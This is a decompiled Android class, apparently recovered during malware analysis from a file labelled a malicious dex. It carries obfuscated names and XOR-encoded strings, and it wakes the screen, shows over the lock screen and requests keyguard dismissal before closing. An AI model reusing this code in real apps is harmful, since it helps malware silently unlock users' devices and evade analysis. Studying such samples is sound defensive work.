package com.zjxyxnvvp.nxvxchltf.util;

import android.app.Activity;
import android.app.KeyguardManager;
import android.os.Build;
import android.os.Bundle;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class AUInawiOBFA extends Activity {
    private static short[] $ = {26580, 26586, 26566, 26584, 26570, 26590, 26573, 26587};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        KeyguardManager keyguardManager = (KeyguardManager) getSystemService($(0, 8, 26559));
        if (Build.VERSION.SDK_INT >= 27) {
            setShowWhenLocked(true);
        }
        if (Build.VERSION.SDK_INT >= 27) {
            setTurnScreenOn(true);
        }
        getWindow().addFlags(6815873);
        if (keyguardManager.isKeyguardLocked() && Build.VERSION.SDK_INT >= 26) {
            keyguardManager.requestDismissKeyguard(this, null);
        }
        finish();
    }
}
